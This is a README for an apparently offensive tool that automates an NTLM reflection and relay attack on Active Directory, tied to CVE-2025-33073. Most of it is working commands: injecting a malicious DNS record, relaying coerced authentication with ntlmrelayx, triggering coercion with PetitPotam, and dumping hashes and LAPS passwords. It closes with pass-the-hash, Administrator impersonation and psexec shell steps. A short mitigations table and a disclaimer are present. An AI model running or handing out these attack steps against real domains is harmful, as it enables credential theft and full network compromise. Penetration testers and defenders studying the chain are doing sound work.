# cupntlm

> **CVE-2025-33073 — NTLM Reflection Bypass via DNS Coercion**  
> Automated exploitation tool for Active Directory environments.

---

## Overview

**cupntlm** automates the NTLM reflection/relay attack chain that abuses CVE-2025-33073. It combines DNS record injection, forced authentication coercion (PetitPotam), and NTLM relay into a single workflow. The tool supports two operational modes depending on scope and stealth requirements.

### Attack Chain Summary

```
Attacker                    Domain Controller              Target Host
   │                               │                            │
   │── 1. Inject DNS record ───────▶│                            │
   │      (attacker IP as target)   │                            │
   │                                │                            │
   │── 2. Coerce auth (PetitPotam) ─────────────────────────────▶│
   │                                │                            │
   │◀─ 3. NTLM auth forwarded back ─────────────────────────────│
   │                                │                            │
   │── 4. Relay to DC ─────────────▶│                            │
   │      (ntlmrelayx)              │                            │
   │                                │                            │
   │◀─ 5. Shell / secretsdump / etc.│                            │
```

**Prerequisites on the target network:**
- SMB signing **disabled** on relay target
- A valid low-privilege domain account (read-only is sufficient)
- Network access to the DC (port 389 LDAP, 445 SMB)

---

## Requirements

### System Packages
| Tool | Purpose |
|------|---------|
| `python3` | Runtime |
| `pip3` | Python package manager |
| `git` | Cloning dependencies |
| `wget` | Downloading files |
| `nmap` | SMB signing enumeration |
| `netexec` / `crackmapexec` | SMB signing check (optional) |

### Python Libraries
| Library | Install |
|---------|---------|
| `impacket` | `pip3 install impacket --break-system-packages` |
| `colorama` | `pip3 install colorama --break-system-packages` |
| `dnspython` | `pip3 install dnspython --break-system-packages` |

### exploit/ Directory Contents (auto-populated by setup.sh)
```
exploit/
├── cupntlm.py
├── ntlmrelayx.py       # from impacket
├── dnstool.py          # from krbrelayx
├── lib/                # krbrelayx support library
└── PetitPotam.py
```

---

## Installation

```bash
git clone https://github.com/yourhandle/cupntlm
cd cupntlm
sudo bash setup.sh
```

---

## Usage

### Check Mode — Verify Attack Feasibility
Checks SMB signing status on targets and validates domain credentials before attempting anything.

```bash
cd exploit
sudo python3 cupntlm.py check \
  --domain lab.local \
  --user pentester \
  --pass 'P@ss' \
  --dc-ip 10.0.0.1 \
  --relay-ip 192.168.1.100
```

### Per-Target Mode — Separate DNS Record Per Host
Creates a unique DNS record for each target, triggers coercion one by one, and cleans up records between iterations. Slower but more precise and leaves less noise.

```bash
sudo python3 cupntlm.py per-target \
  --targets targets.txt \
  --domain lab.local \
  --user pentester \
  --pass 'P@ss' \
  --dc-ip 10.0.0.1 \
  --relay-ip 192.168.1.100 \
  --loot loot.txt
```

### Single Mode — One DNS Record, Persistent Relay
Injects a single DNS record and keeps ntlmrelayx running continuously while iterating through all targets. Faster for large scopes.

```bash
sudo python3 cupntlm.py single \
  --targets targets.txt \
  --domain lab.local \
  --user pentester \
  --pass 'P@ss' \
  --dc-ip 10.0.0.1 \
  --relay-ip 192.168.1.100 \
  --loot loot.txt
```

### targets.txt Format
```
192.168.1.10
192.168.1.11
192.168.1.12
```

---

## Manual Exploitation

The following steps reproduce the full attack chain manually without using `cupntlm.py`. Useful for understanding the primitives, debugging, or adapting to non-standard environments.

### Step 1 — Enumerate SMB Signing

Identify hosts where SMB signing is disabled. These are your valid relay targets.

```bash
netexec smb 192.168.1.0/24 --gen-relay-list targets_unsigned.txt
```

Or with nmap:

```bash
nmap -p 445 --script smb2-security-mode 192.168.1.0/24
```

Look for:
```
Message signing enabled but not required   ← valid relay target
Message signing enabled and required       ← cannot relay here
```

---

### Step 2 — Inject a Malicious DNS Record

Use `dnstool.py` to add an A record in the domain's DNS that points a hostname to your machine. When a target resolves this hostname and authenticates, the request lands on your relay listener.

```bash
cd exploit/

python3 dnstool.py \
  -u "lab.local\\pentester" \
  -p 'P@ss' \
  --action add \
  --record 'attacker-relay' \
  --data 192.168.45.200 \        # your attacker IP
  --type A \
  10.0.0.1                       # DC IP
```

Verify the record was added:

```bash
python3 dnstool.py \
  -u "lab.local\\pentester" \
  -p 'P@ss' \
  --action query \
  --record 'attacker-relay' \
  10.0.0.1
```

---

### Step 3 — Start the NTLM Relay Listener

Start `ntlmrelayx.py` before triggering coercion. It will sit and wait for incoming authentication.

**Relay to SMB — dump SAM/LSA:**
```bash
sudo python3 ntlmrelayx.py \
  -t smb://192.168.1.100 \
  -smb2support \
  --no-http-server
```

**Relay to LDAP — create a new machine account (for RBCD / shadow credentials):**
```bash
sudo python3 ntlmrelayx.py \
  -t ldap://10.0.0.1 \
  --delegate-access \
  --no-smb-server \
  --no-http-server
```

**Relay to LDAPS — dump domain secrets:**
```bash
sudo python3 ntlmrelayx.py \
  -t ldaps://10.0.0.1 \
  --dump-laps \
  --no-smb-server \
  --no-http-server
```

---

### Step 4 — Coerce Authentication with PetitPotam

Trigger the target machine to authenticate outbound to your injected DNS record. PetitPotam abuses the MS-EFSRPC interface — no credentials required on unpatched hosts, or use valid creds for patched ones.

**Unauthenticated (unpatched target):**
```bash
python3 PetitPotam.py \
  192.168.45.200 \         # your listener IP (matches DNS record)
  192.168.1.50             # target host to coerce
```

**Authenticated (patched target, valid creds required):**
```bash
python3 PetitPotam.py \
  -u pentester \
  -p 'P@ss' \
  -d lab.local \
  192.168.45.200 \
  192.168.1.50
```

At this point, the coerced host sends its NTLM authentication to your machine → `ntlmrelayx` catches and relays it.

---

### Step 5 — Collect Output

Depending on the relay target you chose in Step 3:

- **SMB relay** → ntlmrelayx dumps hashes to stdout and writes `<hostname>_samhashes.txt` / `_lsahashes.txt`
- **LDAP delegate-access** → ntlmrelayx prints the created machine account name and password; follow up with `getST.py` for a service ticket
- **LDAPS dump** → LAPS passwords printed directly

---

### Step 6 — Clean Up the DNS Record

Always remove injected DNS records after the engagement.

```bash
python3 dnstool.py \
  -u "lab.local\\pentester" \
  -p 'P@ss' \
  --action remove \
  --record 'attacker-relay' \
  --data 192.168.45.200 \
  --type A \
  10.0.0.1
```

---

## Post-Exploitation Examples

**Pass-the-hash with a relayed machine account:**
```bash
impacket-secretsdump \
  'lab.local/MACHINE$'@10.0.0.1 \
  -hashes :aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
```

**Get a service ticket for S4U2Self (after RBCD):**
```bash
impacket-getST \
  -spn cifs/TARGET.lab.local \
  -impersonate Administrator \
  'lab.local/ATTACKERMACHINE$:password'
```

**Use the ticket:**
```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass TARGET.lab.local
```

---

## Mitigations

| Control | Effect |
|--------|--------|
| Enable SMB signing (required) on all hosts | Breaks relay to SMB |
| Enable LDAP signing + channel binding | Breaks relay to LDAP/LDAPS |
| Patch MS-EFSRPC (KB5005413) | Blocks unauthenticated PetitPotam |
| Restrict DNS record creation to admins | Blocks DNS injection step |
| Disable NTLM network authentication (prefer Kerberos) | Eliminates the entire class |

---

## Disclaimer

This tool is intended for **authorized penetration testing and security research only**.  
Do not use against systems you do not have explicit written permission to test.

---

## Credits

- [fortra/impacket](https://github.com/fortra/impacket) — ntlmrelayx
- [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx) — dnstool
- [topotam/PetitPotam](https://github.com/topotam/PetitPotam) — EFS coercion
